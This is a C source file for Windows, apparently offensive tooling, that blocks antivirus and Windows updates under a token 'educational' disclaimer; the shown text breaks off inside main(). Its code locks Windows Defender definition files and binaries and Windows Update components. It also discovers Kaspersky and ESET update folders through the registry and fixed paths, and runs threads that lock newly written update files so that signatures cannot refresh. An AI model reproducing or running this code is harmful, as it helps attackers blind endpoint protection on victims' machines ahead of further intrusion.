// ============================================================================
// Pussy Blocker - Update Blocker
//
// Author: WeedHashPeddler
//
// EDUCATIONAL WARNING
// This project is an upgraded version of MsNightmare Undefend.
// We are NOT responsible for any misuse of this code.
// It is intended strictly for educational purposes and for
// understanding how AV/EDR update mechanisms work, so such
// flaws can be fixed.
// ============================================================================

#include <windows.h>
#include <stdio.h>

typedef LONG NTSTATUS;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG    Length;
    HANDLE   RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG    Attributes;
    PVOID    SecurityDescriptor;
    PVOID    SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    NTSTATUS   Status;
    ULONG_PTR  Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_ACCESS_DENIED           ((NTSTATUS)0xC0000022L)
#define STATUS_SHARING_VIOLATION       ((NTSTATUS)0xC0000043L)
#define STATUS_NOT_FOUND               ((NTSTATUS)0xC0000034L)
#define STATUS_OBJECT_NAME_NOT_FOUND   ((NTSTATUS)0xC0000034L)
#define STATUS_OBJECT_PATH_NOT_FOUND   ((NTSTATUS)0xC000003AL)

#define OBJ_CASE_INSENSITIVE 0x00000040L
#define FILE_OPEN            0x00000001L
#define FILE_DIRECTORY_FILE  0x00000001L
#define FILE_SYNCHRONOUS_IO_ALERT         0x00000010L
#define FILE_SYNCHRONOUS_IO_NONALERT      0x00000020L
#define FILE_NON_DIRECTORY_FILE           0x00000040L

#define MAX_BLOCKER_DIRS      64
#define MAX_PATH_STR          260
#define MAX_KASPERSKY_PATHS   128

typedef NTSTATUS (NTAPI *pNtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef struct {
    pNtCreateFile     NtCreateFile;
    pNtCreateThreadEx NtCreateThreadEx;
} NT_FUNCTIONS;

static NT_FUNCTIONS nt = {0};

static void InitNtFunctions(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        nt.NtCreateFile = (pNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
        nt.NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    }
}

// --- string helpers (same as upblocker.c) ---

static DWORD UpStrLen(const char* s) { DWORD n = 0; while (s[n]) n++; return n; }

static DWORD UpWStrLen(const wchar_t* s) { DWORD n = 0; while (s[n]) n++; return n; }

static void UpStrCpy(char* dst, const char* src) { while (*src) { *dst++ = *src++; } *dst = '\0'; }

static void UpStrCat(char* dst, const char* src) { while (*dst) dst++; while (*src) { *dst++ = *src++; } *dst = '\0'; }

static int UpStrICmp(const char* a, const char* b) {
    while (*a && *b) {
        char ca = *a, cb = *b;
        if (ca >= 'a' && ca <= 'z') ca -= 32;
        if (cb >= 'a' && cb <= 'z') cb -= 32;
        if (ca != cb) return (ca < cb) ? -1 : 1;
        a++; b++;
    }
    if (*a == *b) return 0;
    return (*a < *b) ? -1 : 1;
}

static const char* UpStrRChr(const char* s, int c) {
    const char* last = NULL;
    while (*s) { if (*s == (char)c) last = s; s++; }
    return last;
}

static void UpStripTrailingBackslash(char* path) {
    DWORD len = UpStrLen(path);
    while (len > 0 && (path[len - 1] == '\\' || path[len - 1] == '/')) {
        path[len - 1] = '\0';
        len--;
    }
}

static void BuildNtPath(const char* ansiPath, wchar_t* ntPath, DWORD ntPathSize) {
    if (ntPathSize < 6) return;
    ntPath[0] = L'\\'; ntPath[1] = L'?'; ntPath[2] = L'?'; ntPath[3] = L'\\';
    DWORD i = 4, j = 0;
    while (ansiPath[j] && i < ntPathSize - 1)
        ntPath[i++] = (wchar_t)(BYTE)ansiPath[j++];
    ntPath[i] = L'\0';
}

static BOOL IsUpdateExtension(const char* ext) {
    if (!ext || *ext != '.') return FALSE;
    DWORD len = 0;
    const char* p = ext + 1;
    while (p[len]) len++;
    if (len == 0 || len > 10) return FALSE;
    char lower[16];
    for (DWORD i = 0; i < len; i++) {
        char c = p[i];
        if (c >= 'A' && c <= 'Z') c += 32;
        lower[i] = c;
    }
    lower[len] = '\0';
    #define CMP_EXT(s) do { \
        char _e[] = s; \
        DWORD _l = 0; while (_e[_l]) _l++; \
        if (len == _l) { \
            BOOL _m = TRUE; \
            for (DWORD _i = 0; _i < len; _i++) \
                if (lower[_i] != _e[_i]) { _m = FALSE; break; } \
            if (_m) return TRUE; \
        } \
    } while(0)
    CMP_EXT("avc"); CMP_EXT("avm"); CMP_EXT("kdb"); CMP_EXT("kdc");
    CMP_EXT("klb"); CMP_EXT("dat"); CMP_EXT("xml"); CMP_EXT("dif");
    CMP_EXT("zip"); CMP_EXT("cab"); CMP_EXT("exe"); CMP_EXT("dll");
    CMP_EXT("idx"); CMP_EXT("bin"); CMP_EXT("sig"); CMP_EXT("vdb");
    CMP_EXT("ndb"); CMP_EXT("db");  CMP_EXT("tmp");
    CMP_EXT("nup"); CMP_EXT("ver");
    #undef CMP_EXT
    return FALSE;
}

// --- File locking via NtCreateFile (function pointer) ---

static HANDLE TryLockFile(const char* ansiPath) {
    if (!nt.NtCreateFile) return NULL;

    wchar_t ntPath[520];
    BuildNtPath(ansiPath, ntPath, 520);
    DWORD len = UpWStrLen(ntPath);
    UNICODE_STRING uniStr;
    uniStr.Length = (USHORT)(len * sizeof(wchar_t));
    uniStr.MaximumLength = (USHORT)((len + 1) * sizeof(wchar_t));
    uniStr.Buffer = ntPath;

    OBJECT_ATTRIBUTES objAttr;
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = &uniStr;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;

    IO_STATUS_BLOCK ioStatus = {0};
    HANDLE hFile = NULL;
    NTSTATUS status = 0;

    int retries = 50;
    do {
        hFile = NULL;
        status = nt.NtCreateFile(&hFile,
            GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
            &objAttr, &ioStatus, NULL,
            FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN,
            FILE_SYNCHRONOUS_IO_ALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);

        if (status == STATUS_NOT_FOUND || status == STATUS_OBJECT_NAME_NOT_FOUND ||
            status == STATUS_OBJECT_PATH_NOT_FOUND) {
            if (--retries <= 0) return NULL;
            Sleep(5);
        } else if (NT_SUCCESS(status)) {
            break;
        } else if (status == STATUS_SHARING_VIOLATION || status == STATUS_ACCESS_DENIED) {
            status = nt.NtCreateFile(&hFile,
                GENERIC_READ | SYNCHRONIZE,
                &objAttr, &ioStatus, NULL,
                FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
                FILE_SYNCHRONOUS_IO_ALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
            if (NT_SUCCESS(status)) break;
            Sleep(5);
            if (--retries <= 0) return NULL;
        } else {
            Sleep(5);
            if (--retries <= 0) return NULL;
        }
    } while (!NT_SUCCESS(status));

    if (!hFile) return NULL;

    OVERLAPPED ov = {0};
    LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK | LOCKFILE_FAIL_IMMEDIATELY, 0, 0xFFFFFFFF, 0xFFFFFFFF, &ov);

    return hFile;
}

// --- Lock directory handle (prevents rename/delete) ---

static BOOL LockDirectory(const char* ansiPath) {
    if (!nt.NtCreateFile) return FALSE;

    wchar_t ntPath[520];
    BuildNtPath(ansiPath, ntPath, 520);
    DWORD len = UpWStrLen(ntPath);
    UNICODE_STRING uniStr;
    uniStr.Length = (USHORT)(len * sizeof(wchar_t));
    uniStr.MaximumLength = (USHORT)((len + 1) * sizeof(wchar_t));
    uniStr.Buffer = ntPath;

    OBJECT_ATTRIBUTES objAttr;
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = &uniStr;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;

    IO_STATUS_BLOCK ioStatus = {0};
    HANDLE hLock = NULL;

    NTSTATUS status = nt.NtCreateFile(&hLock,
        FILE_LIST_DIRECTORY | SYNCHRONIZE,
        &objAttr, &ioStatus, NULL,
        FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN,
        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    return (NT_SUCCESS(status) && hLock) ? TRUE : FALSE;
}

// --- Pre-lock known critical files ---

static void PreLockCriticalFiles(void) {
    { char p[] = "C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\Backup\\mpavbase.vdm";
    (void)TryLockFile(p); }
    { char p[] = "C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\Backup\\mpavbase.lkg";
    (void)TryLockFile(p); }
    { char p[] = "C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\Backup\\mpasbase.vdm";
    (void)TryLockFile(p); }
    { char p[] = "C:\\Windows\\SoftwareDistribution\\DataStore\\DataStore.edb";
    (void)TryLockFile(p); }
    { char p[] = "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs\\edb.log";
    (void)TryLockFile(p); }
    { char p[] = "C:\\Windows\\System32\\MpSigStub.exe";
    (void)TryLockFile(p); }
    { char p[] = "C:\\Program Files\\Windows Defender\\MpCmdRun.exe";
    (void)TryLockFile(p); }
    { char p[] = "C:\\Program Files\\Windows Defender\\MpEng.dll";
    (void)TryLockFile(p); }
    { char p[] = "C:\\Windows\\System32\\wuaueng.dll";
    (void)TryLockFile(p); }
    { char p[] = "C:\\Windows\\System32\\wups2.dll";
    (void)TryLockFile(p); }
    { char p[] = "C:\\Windows\\System32\\wuauclt.exe";
    (void)TryLockFile(p); }
    { char p[] = "C:\\Windows\\System32\\wupsvc.dll";
    (void)TryLockFile(p); }
}

// --- Pre-lock all existing update files under a directory ---

static int PreLockDirectory(const char* directory, int maxDepth) {
    int locked = 0;
    if (maxDepth <= 0) return 0;

    if (UpStrLen(directory) + 4 >= MAX_PATH_STR) return 0;
    char searchPath[MAX_PATH_STR];
    UpStrCpy(searchPath, directory);
    UpStrCat(searchPath, "\\*.*");

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    DWORD dirLen = UpStrLen(directory);
    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (findData.cFileName[0] != '.') {
                DWORD fnLen = UpStrLen(findData.cFileName);
                if (dirLen + 1 + fnLen < MAX_PATH_STR) {
                    char subPath[MAX_PATH_STR];
                    UpStrCpy(subPath, directory);
                    UpStrCat(subPath, "\\");
                    UpStrCat(subPath, findData.cFileName);
                    locked += PreLockDirectory(subPath, maxDepth - 1);
                }
            }
        } else {
            const char* ext = UpStrRChr(findData.cFileName, '.');
            if (ext && IsUpdateExtension(ext)) {
                DWORD fnLen = UpStrLen(findData.cFileName);
                if (dirLen + 1 + fnLen >= MAX_PATH_STR) continue;
                char fullPath[MAX_PATH_STR];
                UpStrCpy(fullPath, directory);
                UpStrCat(fullPath, "\\");
                UpStrCat(fullPath, findData.cFileName);
                if (TryLockFile(fullPath))
                    locked++;
            }
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
    return locked;
}

// --- Kaspersky path discovery ---

static void FindKasperskyVersionDirs(const char* basePath,
    char out[MAX_KASPERSKY_PATHS][MAX_PATH_STR], DWORD* outCount, DWORD maxOut)
{
    char sp[MAX_PATH_STR];
    UpStrCpy(sp, basePath);
    UpStrCat(sp, "\\*");

    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(sp, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;

    do {
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && fd.cFileName[0] != '.') {
            BOOL match = FALSE;
            const char* n = fd.cFileName;
            DWORD nl = UpStrLen(n);
            if (nl >= 3) {
                char p[4];
                p[0] = n[0]; p[1] = n[1]; p[2] = n[2]; p[3] = '\0';
                { char a[] = "AVP"; if (UpStrICmp(p, a) == 0) match = TRUE; }
                if (!match) { char k[] = "KES"; if (UpStrICmp(p, k) == 0) match = TRUE; }
            }
            if (!match && nl >= 9) {
                char low[16];
                for (DWORD i = 0; i < 9 && i < nl; i++) {
                    char c = n[i]; if (c >= 'A' && c <= 'Z') c += 32;
                    low[i] = c;
                }
                low[9] = '\0';
                { char k[] = "kaspersky"; if (UpStrICmp(low, k) == 0) match = TRUE; }
            }
            if (!match) {
                for (DWORD i = 0; n[i]; i++)
                    if (n[i] == '.') { match = TRUE; break; }
            }
            if (match && *outCount < maxOut) {
                if (UpStrLen(basePath) + 1 + nl >= MAX_PATH_STR) continue;
                UpStrCpy(out[*outCount], basePath);
                UpStrCat(out[*outCount], "\\");
                UpStrCat(out[*outCount], n);
                (*outCount)++;
            }
        }
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
}

static void FindKasperskyUpdatePaths(const char* basePath,
    char out[MAX_KASPERSKY_PATHS][MAX_PATH_STR], DWORD* outCount, DWORD maxOut)
{
    char sp[MAX_PATH_STR];
    UpStrCpy(sp, basePath);
    UpStrCat(sp, "\\*");

    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(sp, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;

    do {
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && fd.cFileName[0] != '.') {
            const char* n = fd.cFileName;
            BOOL hit = FALSE;
            { char t[] = "Bases";   if (UpStrICmp(n, t) == 0) hit = TRUE; }
            if (!hit) { char t[] = "Data";    if (UpStrICmp(n, t) == 0) hit = TRUE; }
            if (!hit) { char t[] = "Updates"; if (UpStrICmp(n, t) == 0) hit = TRUE; }
            if (!hit) { char t[] = "Updater"; if (UpStrICmp(n, t) == 0) hit = TRUE; }
            if (!hit) { char t[] = "Temp";    if (UpStrICmp(n, t) == 0) hit = TRUE; }
            if (!hit) { char t[] = "Cache";   if (UpStrICmp(n, t) == 0) hit = TRUE; }
            if (!hit) { char t[] = "Patches"; if (UpStrICmp(n, t) == 0) hit = TRUE; }
            if (hit && *outCount < maxOut) {
                if (UpStrLen(basePath) + 1 + UpStrLen(n) >= MAX_PATH_STR) continue;
                UpStrCpy(out[*outCount], basePath);
                UpStrCat(out[*outCount], "\\");
                UpStrCat(out[*outCount], n);
                (*outCount)++;
                FindKasperskyUpdatePaths(out[*outCount - 1], out, outCount, maxOut);
            }
        }
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
}

static void DiscoverFromBase(const char* basePath,
    char out[MAX_KASPERSKY_PATHS][MAX_PATH_STR], DWORD* outCount)
{
    char (*vd)[MAX_PATH_STR] = (char (*)[MAX_PATH_STR])
        LocalAlloc(LMEM_ZEROINIT, MAX_KASPERSKY_PATHS * MAX_PATH_STR);
    if (!vd) return;

    DWORD vc = 0;
    FindKasperskyVersionDirs(basePath, vd, &vc, MAX_KASPERSKY_PATHS);
    for (DWORD i = 0; i < vc; i++)
        LockDirectory(vd[i]);
    for (DWORD i = 0; i < vc && *outCount < MAX_KASPERSKY_PATHS; i++)
        FindKasperskyUpdatePaths(vd[i], out, outCount, MAX_KASPERSKY_PATHS);

    LocalFree(vd);
}

static void TryRegKey(const char* subKey,
    char out[MAX_KASPERSKY_PATHS][MAX_PATH_STR], DWORD* outCount)
{
    HKEY hKey = NULL;
    LSTATUS regResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, &hKey);
    if (regResult != ERROR_SUCCESS || !hKey) return;

    DWORD type = 0;
    char buf[MAX_PATH_STR] = {0};
    DWORD sz = MAX_PATH_STR - 1;

    { char vn[] = "RootFolder";
    LSTATUS qr = RegQueryValueExA(hKey, vn, NULL, &type, (LPBYTE)buf, &sz);
    if (qr != ERROR_SUCCESS || !buf[0]) {
        sz = MAX_PATH_STR - 1;
        { char vn2[] = "InstallPath";
        qr = RegQueryValueExA(hKey, vn2, NULL, &type, (LPBYTE)buf, &sz); }
    }
    RegCloseKey(hKey); }

    if (buf[0])
        DiscoverFromBase(buf, out, outCount);
}

static void DiscoverKasperskyPaths(char out[MAX_KASPERSKY_PATHS][MAX_PATH_STR], DWORD* outCount) {
    *outCount = 0;

    { char k[] = "SOFTWARE\\KasperskyLab\\Components\\34";
    TryRegKey(k, out, outCount); }
    { char k[] = "SOFTWARE\\KasperskyLab\\protected\\AVP21.8";
    TryRegKey(k, out, outCount); }
    { char k[] = "SOFTWARE\\KasperskyLab\\protected\\AVP21";
    TryRegKey(k, out, outCount); }
    { char k[] = "SOFTWARE\\KasperskyLab\\protected\\AVP22";
    TryRegKey(k, out, outCount); }
    { char k[] = "SOFTWARE\\KasperskyLab\\protected\\AVP23";
    TryRegKey(k, out, outCount); }
    { char k[] = "SOFTWARE\\Wow6432Node\\KasperskyLab\\Components\\34";
    TryRegKey(k, out, outCount); }
    { char k[] = "SOFTWARE\\Wow6432Node\\KasperskyLab\\protected\\AVP21.8";
    TryRegKey(k, out, outCount); }
    { char k[] = "SOFTWARE\\Wow6432Node\\KasperskyLab\\protected\\AVP21";
    TryRegKey(k, out, outCount); }
    { char k[] = "SOFTWARE\\Wow6432Node\\KasperskyLab\\protected\\AVP22";
    TryRegKey(k, out, outCount); }
    { char k[] = "SOFTWARE\\Wow6432Node\\KasperskyLab\\protected\\AVP23";
    TryRegKey(k, out, outCount); }

    { char k[] = "C:\\Program Files (x86)\\Kaspersky Lab";
    if (GetFileAttributesA(k) != INVALID_FILE_ATTRIBUTES)
        DiscoverFromBase(k, out, outCount); }
    { char k[] = "C:\\Program Files\\Kaspersky Lab";
    if (GetFileAttributesA(k) != INVALID_FILE_ATTRIBUTES)
        DiscoverFromBase(k, out, outCount); }
    { char k[] = "C:\\ProgramData\\Kaspersky Lab";
    if (GetFileAttributesA(k) != INVALID_FILE_ATTRIBUTES)
        DiscoverFromBase(k, out, outCount); }
}

// --- ESET path discovery ---

static void FindEsetUpdatePaths(const char* basePath,
    char out[MAX_KASPERSKY_PATHS][MAX_PATH_STR], DWORD* outCount, DWORD maxOut)
{
    char sp[MAX_PATH_STR];
    UpStrCpy(sp, basePath);
    UpStrCat(sp, "\\*");

    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(sp, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;

    do {
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && fd.cFileName[0] != '.') {
            const char* n = fd.cFileName;
            BOOL hit = FALSE;
            { char t[] = "Updfiles"; if (UpStrICmp(n, t) == 0) hit = TRUE; }
            if (!hit) { char t[] = "cache";    if (UpStrICmp(n, t) == 0) hit = TRUE; }
            if (!hit) { char t[] = "backup";   if (UpStrICmp(n, t) == 0) hit = TRUE; }
            if (hit && *outCount < maxOut) {
                if (UpStrLen(basePath) + 1 + UpStrLen(n) >= MAX_PATH_STR) continue;
                UpStrCpy(out[*outCount], basePath);
                UpStrCat(out[*outCount], "\\");
                UpStrCat(out[*outCount], n);
                (*outCount)++;
                FindEsetUpdatePaths(out[*outCount - 1], out, outCount, maxOut);
            }
        }
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
}

static BOOL GetEsetPath(char outInstallDir[MAX_PATH_STR], char outDataDir[MAX_PATH_STR]) {
    outInstallDir[0] = '\0';
    outDataDir[0] = '\0';
    BOOL foundInstall = FALSE;
    BOOL foundData = FALSE;

    { char k[] = "SOFTWARE\\ESET\\ESET Security\\CurrentVersion\\Info";
    HKEY hKey = NULL;
    DWORD type = 0; DWORD sz = MAX_PATH_STR - 1;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, k, 0, KEY_READ, &hKey) == ERROR_SUCCESS && hKey) {
        { char vn[] = "InstallDir";
        if (!foundInstall && RegQueryValueExA(hKey, vn, NULL, &type, (LPBYTE)outInstallDir, &sz) == ERROR_SUCCESS && outInstallDir[0]) {
            UpStripTrailingBackslash(outInstallDir); foundInstall = TRUE;
        } else { sz = MAX_PATH_STR - 1; }}
        { char vn[] = "AppDataDir";
        if (!foundData && RegQueryValueExA(hKey, vn, NULL, &type, (LPBYTE)outDataDir, &sz) == ERROR_SUCCESS && outDataDir[0]) {
            UpStripTrailingBackslash(outDataDir); foundData = TRUE;
        }}
        RegCloseKey(hKey);
    }}

    { char k[] = "SOFTWARE\\Wow6432Node\\ESET\\ESET Security\\CurrentVersion\\Info";
    HKEY hKey = NULL;
    DWORD type = 0; DWORD sz = MAX_PATH_STR - 1;
    if (!foundInstall || !foundData) {
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, k, 0, KEY_READ, &hKey) == ERROR_SUCCESS && hKey) {
        { char vn[] = "InstallDir";
        if (!foundInstall && RegQueryValueExA(hKey, vn, NULL, &type, (LPBYTE)outInstallDir, &sz) == ERROR_SUCCESS && outInstallDir[0]) {
            UpStripTrailingBackslash(outInstallDir); foundInstall = TRUE;
        } else { sz = MAX_PATH_STR - 1; }}
        { char vn[] = "AppDataDir";
        if (!foundData && RegQueryValueExA(hKey, vn, NULL, &type, (LPBYTE)outDataDir, &sz) == ERROR_SUCCESS && outDataDir[0]) {
            UpStripTrailingBackslash(outDataDir); foundData = TRUE;
        }}
        RegCloseKey(hKey);
    }}}

    { char k[] = "SOFTWARE\\ESET\\ESET Endpoint Security\\CurrentVersion\\Info";
    HKEY hKey = NULL;
    DWORD type = 0; DWORD sz = MAX_PATH_STR - 1;
    if (!foundInstall || !foundData) {
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, k, 0, KEY_READ, &hKey) == ERROR_SUCCESS && hKey) {
        { char vn[] = "InstallDir";
        if (!foundInstall && RegQueryValueExA(hKey, vn, NULL, &type, (LPBYTE)outInstallDir, &sz) == ERROR_SUCCESS && outInstallDir[0]) {
            UpStripTrailingBackslash(outInstallDir); foundInstall = TRUE;
        } else { sz = MAX_PATH_STR - 1; }}
        { char vn[] = "AppDataDir";
        if (!foundData && RegQueryValueExA(hKey, vn, NULL, &type, (LPBYTE)outDataDir, &sz) == ERROR_SUCCESS && outDataDir[0]) {
            UpStripTrailingBackslash(outDataDir); foundData = TRUE;
        }}
        RegCloseKey(hKey);
    }}}

    { char k[] = "SOFTWARE\\Wow6432Node\\ESET\\ESET Endpoint Security\\CurrentVersion\\Info";
    HKEY hKey = NULL;
    DWORD type = 0; DWORD sz = MAX_PATH_STR - 1;
    if (!foundInstall || !foundData) {
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, k, 0, KEY_READ, &hKey) == ERROR_SUCCESS && hKey) {
        { char vn[] = "InstallDir";
        if (!foundInstall && RegQueryValueExA(hKey, vn, NULL, &type, (LPBYTE)outInstallDir, &sz) == ERROR_SUCCESS && outInstallDir[0]) {
            UpStripTrailingBackslash(outInstallDir); foundInstall = TRUE;
        } else { sz = MAX_PATH_STR - 1; }}
        { char vn[] = "AppDataDir";
        if (!foundData && RegQueryValueExA(hKey, vn, NULL, &type, (LPBYTE)outDataDir, &sz) == ERROR_SUCCESS && outDataDir[0]) {
            UpStripTrailingBackslash(outDataDir); foundData = TRUE;
        }}
        RegCloseKey(hKey);
    }}}

    if (!foundInstall) {
        { char k[] = "C:\\Program Files\\ESET\\ESET Security";
        if (GetFileAttributesA(k) != INVALID_FILE_ATTRIBUTES)
            { UpStrCpy(outInstallDir, k); foundInstall = TRUE; }}
    }
    if (!foundInstall) {
        { char k[] = "C:\\Program Files\\ESET\\ESET Endpoint Security";
        if (GetFileAttributesA(k) != INVALID_FILE_ATTRIBUTES)
            { UpStrCpy(outInstallDir, k); foundInstall = TRUE; }}
    }
    if (!foundData) {
        { char k[] = "C:\\ProgramData\\ESET\\ESET Security";
        if (GetFileAttributesA(k) != INVALID_FILE_ATTRIBUTES)
            { UpStrCpy(outDataDir, k); foundData = TRUE; }}
    }
    if (!foundData) {
        { char k[] = "C:\\ProgramData\\ESET\\ESET Endpoint Security";
        if (GetFileAttributesA(k) != INVALID_FILE_ATTRIBUTES)
            { UpStrCpy(outDataDir, k); foundData = TRUE; }}
    }

    return foundInstall || foundData;
}

// --- Thread-based directory monitoring ---

struct MonitorArgs {
    BOOL recursive;
    char path[MAX_PATH_STR];
};

static DWORD WINAPI MonitorDirThread(LPVOID lpParam) {
    struct MonitorArgs* args = (struct MonitorArgs*)lpParam;
    if (!args) return 1;

    BOOL recursive = args->recursive;
    char dirPath[MAX_PATH_STR];
    UpStrCpy(dirPath, args->path);
    LocalFree(args);

    if (!nt.NtCreateFile) return 1;

    wchar_t ntPath[520];
    BuildNtPath(dirPath, ntPath, 520);
    DWORD len = UpWStrLen(ntPath);
    UNICODE_STRING uniStr;
    uniStr.Length = (USHORT)(len * sizeof(wchar_t));
    uniStr.MaximumLength = (USHORT)((len + 1) * sizeof(wchar_t));
    uniStr.Buffer = ntPath;

    OBJECT_ATTRIBUTES objAttr;
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = &uniStr;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;

    IO_STATUS_BLOCK ioStatus = {0};
    HANDLE hDir = NULL;

    int retries = 50;
    NTSTATUS stat;
    do {
        stat = nt.NtCreateFile(&hDir,
            FILE_LIST_DIRECTORY | SYNCHRONIZE,
            &objAttr, &ioStatus, NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
        if (NT_SUCCESS(stat)) break;
        Sleep(10);
    } while (--retries > 0 && (stat == STATUS_OBJECT_NAME_NOT_FOUND || stat == STATUS_OBJECT_PATH_NOT_FOUND));

    if (!NT_SUCCESS(stat) || !hDir) return 1;

    char notifyBuf[4096];
    DWORD retBytes;
    DWORD filter = FILE_NOTIFY_CHANGE_SIZE | FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE;

    while (1) {
        for (DWORD i = 0; i < 4096; i++) notifyBuf[i] = 0;
        if (!ReadDirectoryChangesW(hDir, notifyBuf, 4096, recursive, filter, &retBytes, NULL, NULL)) {
            Sleep(500); continue;
        }
        if (retBytes == 0) continue;

        FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)notifyBuf;
        do {
            if (fni->Action == FILE_ACTION_MODIFIED || fni->Action == FILE_ACTION_ADDED ||
                fni->Action == FILE_ACTION_RENAMED_NEW_NAME) {
                char ansiName[260];
                DWORD nc = fni->FileNameLength / sizeof(wchar_t);
                if (nc >= 260) nc = 259;
                for (DWORD j = 0; j < nc; j++)
                    ansiName[j] = (char)(((wchar_t*)fni->FileName)[j] & 0xFF);
                ansiName[nc] = '\0';

                DWORD dl = UpStrLen(dirPath);
                DWORD nl = UpStrLen(ansiName);
                if (dl + 1 + nl < MAX_PATH_STR) {
                    char fullPath[MAX_PATH_STR];
                    UpStrCpy(fullPath, dirPath);
                    UpStrCat(fullPath, "\\");
                    UpStrCat(fullPath, ansiName);

                    const char* ext = UpStrRChr(ansiName, '.');
                    if (ext && IsUpdateExtension(ext))
                        TryLockFile(fullPath);
                }
            }
            if (fni->NextEntryOffset == 0) break;
            fni = (FILE_NOTIFY_INFORMATION*)((BYTE*)fni + fni->NextEntryOffset);
        } while (1);
    }
}

// --- Spawn a monitor thread for a directory ---

static void SpawnMonitor(const char* path, BOOL recursive) {
    if (!nt.NtCreateThreadEx) return;

    struct MonitorArgs* args = (struct MonitorArgs*)
        LocalAlloc(LMEM_ZEROINIT, sizeof(struct MonitorArgs));
    if (!args) return;

    args->recursive = recursive;
    UpStrCpy(args->path, path);

    HANDLE hThread = NULL;
    NTSTATUS st = nt.NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
        (HANDLE)-1, MonitorDirThread, args, 0, 0, 0, 0, NULL);
    if (NT_SUCCESS(st) && hThread)
        CloseHandle(hThread);
    else
        LocalFree(args);
}

// --- Main ---

int main(void) {
    InitNtFunctions();
    if (!nt.NtCreateFile) {
        printf("[-] NtCreateFile unavailable. Exiting.\n");
        return 1;
    }

    printf("=============================================================\n");
    printf("  Pussy Blocker - Update Blocker (MsNightmare Undefend v2)\n");
    printf("  Author: WeedPeddler\n");
    printf("\n");
    printf("  EDUCATIONAL WARNING\n");
    printf("  This is an upgraded version of MsNightmare Undefend.\n");
    printf("  We are NOT responsible for any misuse of this code.\n");
